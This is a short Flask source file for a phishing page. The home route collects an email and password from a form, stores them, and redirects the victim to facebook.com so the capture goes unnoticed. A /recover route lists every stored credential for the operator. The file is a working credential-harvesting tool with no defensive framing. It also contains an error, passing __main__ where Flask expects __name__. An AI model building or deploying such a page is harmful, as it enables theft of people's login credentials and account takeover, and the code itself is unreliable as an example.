from flask import Flask, render_template, request, redirect
from models.user import User
from dotenv import load_dotenv

app = Flask(__main__)
load_dotenv()


@app.route('/', methods=["GET", "POST"])
def home():
    if request.method == "POST":
        email = request.form["email"]
        password = request.form["pass"]
        User(email=email, password=password).save()
        return redirect("https://www.facebook.com")
    return render_template('home.html')


@app.route('/recover')
def password():
    return render_template("user.html", users=User.all())


if __name__ == "__main__":
    app.run()
